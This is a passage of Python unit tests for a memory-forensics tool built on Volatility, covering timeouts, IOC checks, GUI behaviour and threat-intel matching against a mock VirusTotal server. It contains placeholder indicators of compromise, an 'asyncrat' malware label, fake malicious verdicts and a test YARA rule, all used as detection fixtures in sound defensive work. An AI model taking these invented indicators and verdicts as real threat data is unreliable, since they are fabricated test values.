        m = tm.TimeoutModel(tmp)
        os.environ.pop("RAMBREAKER_NO_CALIBRATION", None)
        m.fmt = "raw"
        for gb, d in ((2.0, 8.0), (1.5, 7.0), (34.5, 185.0)):
            m.record("windows.psscan.PsScan", "vol3", "windows", gb, d, True, False)
            m.record("windows.filescan.FileScan", "vol3", "windows", gb, d * 2, True, False)
        m.fmt = "crashdump"
        m.record("windows.psscan.PsScan", "vol3", "windows", 15.9, 946.0, True, False)
        m.record("windows.filescan.FileScan", "vol3", "windows", 15.9, 40.0, True, False)
        m.record("windows.mutantscan.MutantScan", "vol3", "windows", 15.9, 757.0, False, True, 757)
        cfg = m.fit()
        raw_ps = cfg["plugins"]["vol3|windows|windows.psscan.PsScan"]
        check("tm: crash-dump samples kept out of the raw fit", raw_ps["n"] == 3, str(raw_ps))
        m.fmt = "raw"
        e_raw = m.expected("windows.psscan.PsScan", "vol3", "windows", 15.9)
        check("tm: raw 2 GB mutantscan not inflated by a crash-dump timeout",
              m.expected("windows.mutantscan.MutantScan", "vol3", "windows", 2.0) < 120)
        m.fmt = "crashdump"
        e_cd = m.expected("windows.psscan.PsScan", "vol3", "windows", 15.9)
        check("tm: crash-dump psscan estimate = measured", abs(e_cd - 946) < 1, f"{e_raw:.0f} -> {e_cd:.0f}")
        check("tm: crash-dump filescan can be faster than raw",
              m.expected("windows.filescan.FileScan", "vol3", "windows", 15.9) < 45)
        check("tm: censored crash-dump mutantscan >= its timeout",
              m.expected("windows.mutantscan.MutantScan", "vol3", "windows", 15.9) >= 757)
        f = tmp / "x.dmp"
        f.write_bytes(b"PAGEDU64" + b"\0" * 100)
        r = tmp / "x.raw"
        r.write_bytes(b"\0" * 108)
        check("tm: image_format detects PAGEDU64 / raw",
              (tm.image_format(str(f)), tm.image_format(str(r))) == ("crashdump", "raw"))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_ioc_check_attribution_state():
    """Presence results are on disk before the (slow) attribution; its state is recorded."""
    import tempfile, shutil
    from modules import ioc_checker, string_hunt
    tmp = Path(tempfile.mkdtemp())
    orig = string_hunt.StringHunter
    seen = {}
    try:
        img = tmp / "m.raw"
        img.write_bytes(b"\0" * 4096 + b"evil-domain.example" + b"\0" * 4096)
        lst = tmp / "iocs.txt"
        lst.write_text("evil-domain.example\nabsent-domain.example\n", encoding="utf-8")

        class FakeHunter:
            def __init__(self, log):
                self.scan_error = None

            def hunt(self, image, out, terms, vol, os_type="windows"):
                j = json.loads((tmp / "ioc_check" / "ioc_check.json").read_text(encoding="utf-8"))
                seen["pre"] = (j["summary"]["found"], j["summary"]["attribution"])
                self.scan_error = "windows.vadyarascan.VadYaraScan timed out after 9s"
                return {"by_term": {}}

        string_hunt.StringHunter = FakeHunter
        res = ioc_checker.run(str(img), tmp, lst, vol_wrapper=object(), progress=None)
        check("ioc: presence written before attribution",
              seen.get("pre", (0, ""))[0] == 1 and seen["pre"][1].startswith("running"), seen)
        check("ioc: attribution timeout recorded, presence kept",
              res["summary"]["found"] == 1 and res["summary"]["attribution"].startswith("incomplete")
              and "timed out" in res["summary"]["attribution"], res["summary"])
        res2 = ioc_checker.run(str(img), tmp, lst, attribute_processes=False)
        check("ioc: attribution off -> 'not run'", res2["summary"]["attribution"] == "not run",
              res2["summary"])
    finally:
        string_hunt.StringHunter = orig
        shutil.rmtree(tmp, ignore_errors=True)


def test_linux_elfs_labels():
    """A Linux 'exe' dump that only got [vdso]/libraries is EMPTY with a reason, not OK."""
    from modules.extract_jobs import Job as ExtractJob
    so = ("PID\tProcess\tStart\tEnd\tFile Path\tFile Output\n"
          "754\tnetworkd-dispat\t0x7ffcd29ca000\t0x7ffcd29cc000\t[vdso]\tpid.754.networkd-dispat.0x7ffcd29ca000.dmp\n"
          "900\tsshd\t0x55d0c0000000\t0x55d0c0010000\t/usr/sbin/sshd\tpid.900.sshd.0x55d0c0000000.dmp\n"
          "900\tsshd\t0x7f0000000000\t0x7f0000010000\t/usr/lib/x86_64-linux-gnu/libc.so.6\tpid.900.sshd.0x7f0000000000.dmp\n")
    its = {
        "754": {"outputs": [{"file": "pid_754_x/exe/pid.754.networkd-dispat.0x7ffcd29ca000.dmp", "part": "exe"}],
                "detail": ""},
        "900": {"outputs": [{"file": "pid_900_sshd/exe/pid.900.sshd.0x55d0c0000000.dmp", "part": "exe"},
                            {"file": "pid_900_sshd/exe/pid.900.sshd.0x7f0000000000.dmp", "part": "exe"}],
                "detail": ""},
        "1971": {"outputs": [], "detail": "exe: no output", "status": "pending"},
    }
    ExtractJob._label_elfs(its, so)
    check("elfs: PID listed nothing -> EMPTY with the reason, not FAILED",
          its["1971"]["status"] == "empty" and "no resident ELF" in its["1971"]["detail"], its["1971"])
    its2 = {"5": {"outputs": [], "detail": "exe: no output", "status": "pending"}}
    ExtractJob._label_elfs(its2, "")          # plugin printed nothing at all -> stays a failure
    check("elfs: no table printed -> left as failure", its2["5"]["status"] == "pending", its2["5"])
    check("elfs: [vdso]-only exe dump flagged, reason given",
          its["754"].get("exe_missing") and "[vdso]" in its["754"]["detail"], its["754"])
    check("elfs: outputs named after their object",
          {o.get("object") for o in its["900"]["outputs"]} ==
          {"/usr/sbin/sshd", "/usr/lib/x86_64-linux-gnu/libc.so.6"}, its["900"])
    check("elfs: program present -> not flagged", not its["900"].get("exe_missing")
          and not its["900"]["detail"], its["900"])


def test_vol2_resume_clean_empty():
    """A Vol2 plugin that ran fine and found nothing is not re-run on resume."""
    import tempfile
    from modules.volatility import vol2_done, _write_empty_marker, _write_error_marker
    with tempfile.TemporaryDirectory() as td:
        j = Path(td) / "clipboard_vol2.json"
        j.write_text("[]", encoding="utf-8")
        check("vol2 resume: bare '[]' (older/failed run) -> re-run", not vol2_done(j))
        _write_empty_marker(j, True)
        check("vol2 resume: clean empty run -> done", vol2_done(j))
        _write_error_marker(j, False, "exit 1")
        check("vol2 resume: error sidecar wins -> re-run", not vol2_done(j))
        _write_error_marker(j, True, "")
        _write_empty_marker(j, False)
        check("vol2 resume: marker cleared on a non-empty/failed run", not vol2_done(j))
        j.write_text('[{"Session": 1, "Format": "CF_TEXT"}]', encoding="utf-8")
        check("vol2 resume: rows -> done", vol2_done(j))


def test_linux_malfind_skip_fix():
    """Vol3 linux malfind dirty-page walk jumps over unmapped page-table blocks
    (a smeared 127 TiB r-x VMA made it time out twice on dump.mem)."""
    import importlib.util
    import tempfile
    from modules.installer import VolatilityInstaller
    fix = [f for f in VolatilityInstaller._FRAMEWORK_FIXES
           if f[0] == "framework/plugins/linux/malware/malfind.py"]
    check("linux malfind framework fix registered", len(fix) == 1)
    if not fix:
        return
    rel, buggy, fixed = fix[0]
    src = ("class _E:\n"
           "    class InvalidAddressException(Exception):\n"
           "        pass\n"
           "    class PagedInvalidAddressException(InvalidAddressException):\n"
           "        def __init__(self, bits):\n"
           "            self.invalid_bits = bits\n"
           "exceptions = _E\n\n"
           "def _get_dirty_pages(proc_layer, vma):\n"
           "        page_addr = vma.vm_start\n"
           "        while page_addr < vma.vm_end:\n"
           "            try:\n"
           "                _, page_size, _ = proc_layer._translate(page_addr)\n"
           "                if proc_layer.is_dirty(page_addr):\n"
           "                    yield page_addr, page_size\n"
           + buggy)
    with tempfile.TemporaryDirectory() as td:
        target = Path(td) / "volatility3" / rel
        target.parent.mkdir(parents=True)
        target.write_text(src, encoding="utf-8")
        res = VolatilityInstaller(logging.getLogger("t")).apply_framework_fixes(Path(td))
        check("linux malfind fix applied to the buggy text", res.get(rel) is True, res)
        spec = importlib.util.spec_from_file_location("rb_fake_malfind", target)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        E = mod.exceptions
        dirty = 0x558300000000
        calls = [0]

        class Layer:
            page_size = 4096

            def _translate(self, a):
                calls[0] += 1
                if a >> 39 != dirty >> 39:          # PML4 entry absent: 512 GiB block
                    raise E.PagedInvalidAddressException(39)
                if a >> 30 != dirty >> 30:          # PDPT entry absent: 1 GiB block
                    raise E.PagedInvalidAddressException(30)
                if a >> 21 != dirty >> 21:          # page table absent: 2 MiB block
                    raise E.PagedInvalidAddressException(21)
                if a != dirty:
                    raise E.PagedInvalidAddressException(12)
                return a, 4096, None

            def is_dirty(self, a):
                return a == dirty

        vma = types.SimpleNamespace(vm_start=0, vm_end=0x7f63eb874000)
        got = list(mod._get_dirty_pages(Layer(), vma))
        check("linux malfind fix: finds the dirty page", got == [(dirty, 4096)], got)
        check("linux malfind fix: unmapped space skipped in blocks (< 2000 lookups)",
              calls[0] < 2000, calls[0])


def test_gui_fast_sort():
    """Results tables open unsorted and sort/filter on the Python rows (16 s -> < 1 s)."""
    try:
        os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
        from PySide6.QtCore import Qt
        from PySide6.QtWidgets import QApplication
    except Exception:
        print("  SKIP  gui fast sort (PySide6 not installed)")
        return
    import time
    app = QApplication.instance() or QApplication([])
    from gui import results_view as rvm, theme, widgets
    widgets.set_theme(theme.palette("dark"))
    rows = [{"t": f"2026-01-{(i * 7919) % 28 + 1:02d}", "pid": (i * 104729) % 50000, "d": f"x{i}"}
            for i in range(60000)]
    t = time.perf_counter()
    pg = rvm.TablePage("T", rows)
    app.processEvents()
    check("gui: 60k-row page opens unsorted in < 3 s",
          time.perf_counter() - t < 3 and pg.model.rows[0]["d"] == "x0", time.perf_counter() - t)
    t = time.perf_counter()
    pg.view.sortByColumn(pg.model.cols.index("pid"), Qt.DescendingOrder)
    app.processEvents()
    shown = [pg.model.rows[pg.proxy.mapToSource(pg.proxy.index(i, 0)).row()]["pid"]
             for i in range(pg.proxy.rowCount())]
    check("gui: header sort numeric descending, < 3 s",
          shown == sorted(shown, reverse=True) and time.perf_counter() - t < 3)
    pg.proxy.set_needle("X5999")
    check("gui: filter is case-insensitive over any column",
          pg.proxy.rowCount() == sum(1 for r in rows if "x5999" in r["d"]), pg.proxy.rowCount())


def test_gui_extract_job_done():
    """A finished extraction job announces its manifest and grows a squeezed results pane."""
    try:
        os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
        from PySide6.QtWidgets import QApplication
    except Exception:
        print("  SKIP  gui extract job done (PySide6 not installed)")
        return
    import tempfile
    app = QApplication.instance() or QApplication([])
    from gui.extract_view import ExtractView
    v = ExtractView(lambda lvl, msg: None)
    v.resize(1500, 900)
    v.show()
    app.processEvents()
    v.split.setSizes([800, 40])
    app.processEvents()
    before = v.split.sizes()[1]
    got = []
    v.job_finished.connect(got.append)
    v.job = {"kind": "files", "dest": os.path.join(tempfile.gettempdir(), "rb_no_such_job"),
             "t0": 0, "result": {"manifest": "m.json", "ok": 1}}
    v._on_done(0, False)
    app.processEvents()
    check("gui extract: job_finished emitted with the manifest", got == ["m.json"], got)
    row = {c: "x" for c, _ in v.r_model.cols} if hasattr(v.r_model, "cols") else {}
    v.split.setSizes([800, 40])
    app.processEvents()
    v.r_model.set_rows([dict(row, item=str(i)) for i in range(2)])
    v._reveal_results()
    app.processEvents()
    check("gui extract: 2 result rows fit the 3-row minimum -> lists above keep their space",
          v.split.sizes()[1] == before, (before, v.split.sizes()))
    v.r_model.set_rows([dict(row, item=str(i)) for i in range(9)])
    v._reveal_results()
    app.processEvents()
    rh = v.r_view.verticalHeader().defaultSectionSize()
    check("gui extract: 9 result rows -> pane grows to show 6",
          v.split.sizes()[1] > before and v.r_view.viewport().height() >= 6 * rh - 2,
          (before, v.split.sizes(), v.r_view.viewport().height(), rh))
    v.tabs.setCurrentIndex(2)
    v.resize(1500, 620)                      # the e2e window: 960 px minus the live log
    app.processEvents()
    v._reveal_results()
    app.processEvents()
    vis = [w.viewport().height() for w in (v.v_pview, v.v_rview)]
    check("gui extract: VAD process + region lists keep >= 2 rows after the pane grows",
          min(vis) >= 2 * 22 - 2, vis)
    v.close()


def test_gui_mode_split():
    """Plugin category + Fast mode fold into the unchanged CLI -m; old speed settings load."""
    try:
        os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
        from PySide6.QtWidgets import QApplication
    except Exception:
        print("  SKIP  gui mode split (PySide6 not installed)")
        return
    app = QApplication.instance() or QApplication([])
    from gui import main_window as mw, theme, widgets
    from modules.extractor import VALID_MODES
    widgets.set_theme(theme.palette("dark"))
    check("mode split: every CLI -m value round-trips through the two controls",
          all(mw.mode_for(*mw.split_mode(m)) == m for m in VALID_MODES),
          {m: mw.split_mode(m) for m in VALID_MODES})
    check("mode split: unknown/old value falls back to the complete set",
          mw.split_mode("bogus") == ("full", False) and mw.split_mode("") == ("full", False))
    check("mode split: fast mode wins over a category (one quick set)",
          mw.mode_for("network", True) == "fast" and mw.mode_for("network", False) == "network")
    sp = mw.SetupPanel(dict(mw.DEFAULT_SETTINGS))
    sp.dump.setText(r"D:\Cases\memory.raw")
    got = {}
    for i, (name, cmd, mode) in enumerate(mw.PRESETS):
        sp.preset.setCurrentIndex(i)
        a = sp.build_args({})
        got[name] = (a[0], a[a.index("-m") + 1])
    check("presets: same CLI command and -m as before the split",
          all(got[n] == (c, m) for n, c, m in mw.PRESETS), got)
    sp.preset.setCurrentIndex(1)                                   # Quick triage
    check("fast mode on: category locked to 'All categories', note shown",
          sp.fast.isChecked() and not sp.category.isEnabled() and sp.category.currentData() == "full"
          and not sp.fast_note.isHidden())
    sp.fast.setChecked(False)
    sp.category.setCurrentIndex(sp.category.findData("registry"))
    check("fast mode off: category free again -> -m registry",
          sp.category.isEnabled() and sp.mode_value() == "registry" and sp.fast_note.isHidden())
    sp.fast.setChecked(True)
    check("ticking fast mode on a category -> -m fast, category reset",
          sp.mode_value() == "fast" and sp.category.currentData() == "full")
    sp.fast.setChecked(False)
    for v in ("normal", "fast", "fastest"):
        p = mw.SetupPanel(dict(mw.DEFAULT_SETTINGS, speed=v))
        p.dump.setText("x.raw")
        a = p.build_args({})
        d = mw.SettingsDialog(dict(mw.DEFAULT_SETTINGS, speed=v))
        check(f"old setting speed={v}: shown, passed as --speed {v}, saved back as {v}",
              p.speed_value() == v and a[a.index("--speed") + 1] == v
              and d.result_settings()["speed"] == v)
    check("unknown saved speed falls back to normal",
          mw.SetupPanel(dict(mw.DEFAULT_SETTINGS, speed="turbo")).speed_value() == "normal")
    # guides: every '?' guide has text, both themes' media, tokens filled
    from gui import help_guide, help_registry as hr
    from PySide6.QtGui import QMovie
    bad, big = [], []
    for key, g in hr.GUIDES.items():
        if hr.get(key) is None:
            bad.append(f"{key}: no short help entry")
        for label, media, html in g["pages"]:
            if "[[" in help_guide.render(html, theme.palette("dark")):
                bad.append(f"{key}/{label}: unfilled token")
            for t in ("dark", "light"):
                p = help_guide.media_dir() / f"{media}_{t}.gif"
                if not p.is_file() or not QMovie(str(p)).isValid():
                    bad.append(f"{p.name}: missing or not a GIF")
                elif p.stat().st_size > 400 * 1024:
                    big.append((p.name, p.stat().st_size))
    check("guides: text, tokens and dark+light GIF for every page", not bad, bad[:8])
    check("guides: every animation <= 400 KB", not big, big)
    from gui.help_check import check as help_cover
    w = help_guide.GuideWindow("setup.preset", None, 4)
    app.processEvents()
    cov = help_cover(w)
    check("guide window: non-modal, opens on the asked page, every control has help",
          not w.isModal() and w.pages.currentItem().text() == "Malware hunt"
          and not cov["missing"] and not cov["invalid"] and w.movie is not None, cov)
    w._step(1)
    check("guide window: step button pauses and advances the animation",
          w.movie.state() == QMovie.Paused and w.movie.currentFrameNumber() == 1,
          (w.movie.state(), w.movie.currentFrameNumber()))
    w.close()


def test_gui_wheel_guard():
    """Mouse wheel over a Case-setup drop-down / number box scrolls the panel and never
    changes the value (Qt's default changed Preset, Engine, Parallel jobs on hover)."""
    try:
        os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
        from PySide6.QtCore import QPoint, QPointF, QRect, Qt
        from PySide6.QtTest import QTest
        from PySide6.QtWidgets import QApplication, QFrame, QScrollArea
    except Exception:
        print("  SKIP  gui wheel guard (PySide6 not installed)")
        return
    print("[gui wheel guard]")
    app = QApplication.instance() or QApplication([])
    from gui import main_window as mw, theme, widgets
    widgets.set_theme(theme.palette("dark"))
    widgets.install_wheel_guard()
    widgets.install_wheel_guard()                        # idempotent
    sp = mw.SetupPanel(dict(mw.DEFAULT_SETTINGS))
    sc = QScrollArea()
    sc.setWidget(sp)
    sc.setWidgetResizable(True)
    sc.setFrameShape(QFrame.NoFrame)
    sc.resize(400, 300)                                  # short: the panel has to scroll
    sc.show()
    QTest.qWait(50)
    bar, vp = sc.verticalScrollBar(), sc.viewport()

    def aim(w):
        """Scroll w into view; the centre of its visible part (the panel can be wider than the view)."""
        sc.horizontalScrollBar().setValue(0)
        sc.ensureWidgetVisible(w, 0, 0)
        QTest.qWait(20)
        r = QRect(w.mapTo(vp, QPoint(0, 0)), w.size()).intersected(vp.rect())
        return vp.mapTo(sc, r.center())

    def wheel(win, at):
        """One real (spontaneous) wheel notch down at `at` in window `win`."""
        QTest.mouseMove(win, at)
        QTest.wheelEvent(win, QPointF(at), QPoint(0, -120))
        QTest.qWait(20)

    def value(w):
        return w.currentIndex() if hasattr(w, "currentIndex") else w.value()

    got = {}
    for name in ("preset", "category", "engine", "jobs", "speed"):
        w = getattr(sp, name)
        bar.setValue(0)
        at = aim(w)
        v0, b0 = value(w), bar.value()
        wheel(sc.windowHandle(), at)
        got[name] = (value(w) == v0, bar.value() > b0 or b0 == bar.maximum(), w.hasFocus())
    check("wheel over setup drop-downs / jobs box: value kept, panel scrolls, no focus grab",
          all(k and s and not f for k, s, f in got.values()), got)
    sp.engine.setFocus(Qt.MouseFocusReason)
    bar.setValue(0)
    at = aim(sp.engine)
    i0, b0 = sp.engine.currentIndex(), bar.value()
    wheel(sc.windowHandle(), at)
    check("wheel over a clicked-into drop-down still scrolls the panel, value kept",
          sp.engine.currentIndex() == i0 and bar.value() > b0, (i0, sp.engine.currentIndex(), b0, bar.value()))
    QTest.keyClick(sp.engine, Qt.Key_Down)
    check("keyboard still changes a focused drop-down", sp.engine.currentIndex() == i0 + 1)
    sp.known.setChecked(True)                            # editable Vol2 profile box (20 items)
    QTest.qWait(50)
    sp.profile.setMaxVisibleItems(5)
    sp.profile.showPopup()
    QTest.qWait(50)
    pop, lv = QApplication.activePopupWidget(), sp.profile.view()
    lb0 = lv.verticalScrollBar().value()
    wheel(pop.windowHandle(), lv.viewport().mapTo(pop, lv.viewport().rect().center()))
    check("an OPEN drop-down list still scrolls with the wheel",
          lv.verticalScrollBar().value() > lb0 and sp.profile.currentIndex() == 0,
          (lb0, lv.verticalScrollBar().value()))
    sp.profile.hidePopup()
    d = mw.SettingsDialog(dict(mw.DEFAULT_SETTINGS))   # a dialog built later is covered too
    d.show()
    QTest.qWait(50)
    t0 = d.tmo.value()
    wheel(d.windowHandle(), d.tmo.mapTo(d, d.tmo.rect().center()))
    check("Settings dialog: wheel keeps the timeout box", d.tmo.value() == t0 and not d.tmo.hasFocus())
    d.close()
    sc.close()


def test_threat_intel():
    """v2.2 DFIR + Threat Intel: feeds, matching, VT client (mock server), hash quality,
    YARA, shortlist, secret store, report tab, bulk dump attribution."""
    import shutil
    import tempfile
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    print("[threat intel]")
    tmp = Path(tempfile.mkdtemp())
    old_home = os.environ.get("RAMBREAKER_HOME")
    os.environ["RAMBREAKER_HOME"] = str(tmp)
    try:
        from modules import ti_sources as ts
        from modules import vt_client
        from modules import threat_intel as ti
        # ---- feed parsing
        ip = list(ts.parse_source(ts.BY_ID["ipsum"], "# c\n1.2.3.4\t7\n5.6.7.8\t1\n9.9.9.9\t3\n"))
        check("ipsum: single-list IPs dropped, weight by list count",
              [(k, v, w) for k, v, _, w in ip] == [("ip", "1.2.3.4", 3), ("ip", "9.9.9.9", 2)], ip)
        tr = list(ts.parse_source(ts.BY_ID["maltrail"], "# ref\nevil.example.com\n1.2.3.4:443\n"
                                  "/gate.php\nhttp://bad.test/x.exe\n", "malware: asyncrat"))
        check("trails: domain, ip:port, url kept; path-only trail skipped",
              [(k, v) for k, v, _, _ in tr] == [("domain", "evil.example.com"), ("ip", "1.2.3.4"),
                                                  ("url", "http://bad.test/x.exe")], tr)
        dr = list(ts.parse_source(ts.BY_ID["spamhaus_drop"], '{"cidr":"10.9.0.0/16","sblid":"SBL1"}\n{"type":"meta"}\n'))
        check("spamhaus drop: cidr rows", dr and dr[0][:2] == ("cidr", "10.9.0.0/16"), dr)
        # ---- local DB + match
        (tmp / "threat_intel_db" / "downloaded" / "trails" / "malware").mkdir(parents=True)
        (tmp / "threat_intel_db" / "downloaded" / "trails" / "malware" / "asyncrat.txt").write_text(
            "evil.example.com\n203.0.113.9\n", encoding="utf-8")
        (tmp / "threat_intel_db" / "downloaded" / "spamhaus_drop.json").write_text(
            '{"cidr":"198.51.100.0/24","sblid":"SBL9"}\n', encoding="utf-8")
        (tmp / "threat_intel_db" / "bundled").mkdir(parents=True)
        (tmp / "threat_intel_db" / "bundled" / "ipsum.txt").write_text("8.8.4.4\t2\n", encoding="utf-8")
        st = {r["id"]: r for r in ts.status()}
        check("status: present / where / missing", st["maltrail"]["present"] and st["maltrail"]["where"] == "downloaded"
              and st["ipsum"]["where"] == "bundled" and not st["cins"]["present"], {k: (v["present"], v["where"]) for k, v in st.items()})
        ind = {"ip": {"203.0.113.9": ["connection: x.exe"], "198.51.100.7": ["string in memory (IOC list)"],
                      "8.8.4.4": ["x"]},
               "domain": {"a.b.evil.example.com": ["browser history"], "example.com": ["s"]},
               "url": {}, "sha256": {}, "sha1": {}, "md5": {}}
        hits, used = ts.match(ind)
        hv = {(h["kind"], h["value"], h["source"]) for h in hits}
        check("match: trail IP, CIDR network, parent-domain suffix, ipsum",
              ("ip", "203.0.113.9", "maltrail") in hv and ("ip", "198.51.100.7", "spamhaus_drop") in hv
              and ("domain", "a.b.evil.example.com", "maltrail") in hv and ("ip", "8.8.4.4", "ipsum") in hv, hv)
        check("match: a listed sub-domain never flags its parent", ("domain", "example.com", "maltrail") not in hv)
        check("match: reports which sources were used", {u["id"] for u in used} >= {"maltrail", "spamhaus_drop", "ipsum"})
        # ---- VT client against a local mock
        calls = []

        class H(BaseHTTPRequestHandler):
            def do_GET(self):
                calls.append((self.path, self.headers.get("x-apikey")))
                if self.headers.get("x-apikey") == "bad":
                    code, body = 401, {"error": {"code": "WrongCredentialsError"}}
                elif "quota" in self.path:
                    code, body = 429, {"error": {"code": "QuotaExceededError"}}
                elif self.path.endswith("/" + "a" * 64):
                    code, body = 200, {"data": {"attributes": {
                        "last_analysis_stats": {"malicious": 40, "suspicious": 1, "harmless": 0, "undetected": 20},
                        "popular_threat_classification": {"suggested_threat_label": "trojan.asyncrat"},
                        "names": ["evil.exe"]}}}
                else:
                    code, body = 404, {"error": {"code": "NotFoundError"}}
                b = json.dumps(body).encode()
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(b)))
                self.end_headers()
                self.wfile.write(b)

            def log_message(self, *a):
                pass

        srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        old_base = vt_client.BASE
        vt_client.BASE = f"http://127.0.0.1:{srv.server_port}/api/v3"
        try:
            sent = tmp / "sent.txt"
            c = vt_client.VTClient("k1", per_minute=6000, sent_log=sent, cache=tmp / "vtc")
            d = c.lookup("file", "A" * 64)
            check("vt: malicious file summarised", d["verdict"] == "malicious" and d["malicious"] == 40
                  and d["label"] == "trojan.asyncrat" and d["link"].startswith("https://www.virustotal.com/gui/file/"), d)
            d2 = c.lookup("file", "a" * 64)
            check("vt: second lookup comes from the cache (no request)", d2["cached"] and len(calls) == 1, len(calls))
            nf = c.lookup("domain", "unknown-domain.com")
            check("vt: 404 = not on VirusTotal", not nf["found"] and nf["verdict"] == "not on VirusTotal", nf)
            refused = []
            for kind, v in (("ip", "10.1.2.3"), ("ip", "192.168.1.5"), ("domain", "dc01.corp"), ("domain", "host.local")):
                try:
                    c.lookup(kind, v)
                except ValueError:
                    refused.append(v)
            check("vt: private IPs and internal names are never sent", len(refused) == 4 and len(calls) == 2, (refused, calls))
            check("vt: every identifier sent is logged", sent.read_text(encoding="utf-8").count("\n") == 2)
            check("vt: key travels in the x-apikey header, not the URL", all(k == "k1" and "k1" not in p for p, k in calls))
            q = False
            try:
                c.lookup("domain", "quota.example.org")
            except vt_client.QuotaExceeded:
                q = True
            check("vt: HTTP 429 quota -> QuotaExceeded", q and c.quota_hit)
            bk = False
            try:
                vt_client.VTClient("bad", per_minute=6000, cache=tmp / "vtc2").lookup("ip", "8.8.8.8")
            except vt_client.BadKey:
                bk = True
            check("vt: refused key -> BadKey", bk)
            slept = []
            c3 = vt_client.VTClient("k1", per_minute=4, cache=tmp / "vtc3", sleep=slept.append)
            c3.lookup("domain", "one-domain.com")
            c3.lookup("domain", "two-domain.com")
            check("vt: paced to the per-minute rate", slept and 14 < slept[0] <= 15, slept)
        finally:
            vt_client.BASE = old_base
            srv.shutdown()
        # ---- hash quality, location
        f = tmp / "f.dat"
        f.write_bytes(b"MZ" + b"x" * 4094 + bytes(4096) + b"y" * 100)
        e = {"kind": "file", "size": f.stat().st_size, "nonzero_pct": 50, "type": "PE (Windows executable/DLL)"}
        check("quality: a zero-filled page = partial", ti.hash_quality(e, f)[0] == "partial", ti.hash_quality(e, f))
        g = tmp / "g.dat"
        g.write_bytes(b"#!/bin/sh\necho hi\n")
        check("quality: complete file", ti.hash_quality({"kind": "file", "size": 18, "nonzero_pct": 100}, g)[0] == "complete")
        check("quality: process exe = rebuilt", ti.hash_quality({"kind": "process", "size": 9, "nonzero_pct": 9}, g)[0] == "rebuilt")
        check("quality: .img section = rebuilt", ti.hash_quality({"kind": "file", "size": 9, "nonzero_pct": 9},
                                                                tmp / "file.0x1.0x2.ImageSectionObject.a.exe.img")[0] == "rebuilt")
        check("location: Temp/AppData odd, System32 system",
              ti.location_class(r"\Device\HarddiskVolume2\Users\bob\AppData\Local\Temp\a.exe", "windows") == "odd"
              and ti.location_class(r"\Device\HarddiskVolume2\Windows\System32\cmd.exe", "windows") == "system"
              and ti.location_class("/tmp/.x/kworker", "linux") == "odd"
              and ti.location_class("/usr/bin/bash", "linux") == "system")
        # ---- YARA: custom rule compiled, broken file skipped, scan hits
        cust = tmp / "yara_rules" / "custom"
        cust.mkdir(parents=True)
        (cust / "mine.yar").write_text('rule Test_Marker { meta: score = 90 strings: $a = "RB_TI_MARKER" condition: $a }',
                                       encoding="utf-8")
        (cust / "broken.yar").write_text("rule { nope", encoding="utf-8")
        import logging
        info = ti.compile_rules("core", [], logging.getLogger("t"))
        check("yara: custom rule compiled, broken file skipped and named",
              info["compiled"] and info["rules"] == 1 and len(info["skipped"]) == 1, info)
        tgt = tmp / "t.bin"
        tgt.write_bytes(b"\0" * 100 + b"RB_TI_MARKER" + b"\0" * 10)
        ti._yara_init(info["compiled"])
        idx, ms, err = ti._yara_scan((0, str(tgt), r"C:\x\t.bin"))
        check("yara: scan reports rule, namespace, offset", not err and ms and ms[0]["rule"] == "Test_Marker"
              and ms[0]["namespace"].startswith("custom_") and ms[0]["strings"][0]["offset"] == 100, (ms, err))
        check("yara: custom rule hit = HIGH", ti.yara_severity(ms[0]) == "HIGH")
        # ---- shortlist scoring
        case = tmp / "case"
        (case / "json").mkdir(parents=True)
        (case / "json" / "network_map.json").write_text(json.dumps({"connections": [
            {"pid": "9", "process": "x.exe", "remote": "45.148.10.151:443", "proto": "TCPv4", "state": "ESTABLISHED"},
            {"pid": "9", "process": "x.exe", "remote": "10.0.0.2:445", "proto": "TCPv4", "state": "ESTABLISHED"}]}),
            encoding="utf-8")
        (case / "SUMMARY.txt").write_text("OS: windows\n", encoding="utf-8")

        class V:
            os_type, vol_version, vol3_cmd, vol2_cmd, profile = "windows", "vol3", "x", "", ""
        T = ti.ThreatIntel(case, "", V(), logging.getLogger("t"), {})
        inv = [{"kind": "file", "name": "a.exe", "path": r"\Users\bob\AppData\a.exe", "pid": "", "process": "",
                "file": "dumps/files/files/a.dat", "sha256": "a" * 64, "sha1": "", "md5": "", "quality": "complete",
                "location": "odd", "executable": True, "injection": "", "flags": [], "size": 10, "type": "PE "}]
        ind = T.indicators(inv)
        check("indicators: public connection IP kept, private dropped",
              "45.148.10.151" in ind["ip"] and "10.0.0.2" not in ind["ip"], ind["ip"])
        fh = [{"kind": "ip", "value": "45.148.10.151", "source": "maltrail", "source_name": "Maltrail",
               "label": "malware: asyncrat", "weight": 3, "confidence": "HIGH", "found_in": ind["ip"]["45.148.10.151"]}]
        yh = [dict(ms[0], object="a.exe", kind="file", path=inv[0]["path"], pid="", process="", sha256="a" * 64,
                   file=inv[0]["file"], severity="HIGH")]
        sl = T.shortlist(inv, yh, fh)
        top = {s["name"]: s for s in sl}
        check("shortlist: YARA + odd location on one object, feed-hit connection IP high",
              top["a.exe"]["score"] >= 90 and len(top["a.exe"]["reasons"]) == 2 and top["45.148.10.151"]["score"] >= 85, sl)
        vt = {"results": [{"kind": "file", "id": "a" * 64, "state": "checked", "verdict": "malicious", "malicious": 40,
                           "total": 61, "label": "trojan", "link": "https://www.virustotal.com/gui/file/x", "found": True}]}
        ti.apply_vt(sl, inv, vt)
        check("vt verdict folded into shortlist + inventory", sl[0]["name"] == "a.exe" and sl[0]["score"] == 100
              and inv[0]["vt"].startswith("malicious"), (sl[0], inv[0].get("vt")))
        # ---- secret store
        from modules import secret_store
        if secret_store.available():
            secret_store.put("virustotal", "SECRET-123")
            raw = (tmp / "config" / "secrets.dat").read_text(encoding="ascii")
            check("secret store: DPAPI round trip, not plain text on disk",
                  secret_store.get("virustotal") == "SECRET-123" and "SECRET-123" not in raw)
            secret_store.put("virustotal", None)
            check("secret store: forget", secret_store.get("virustotal") == "")
        # ---- report tab + escaping
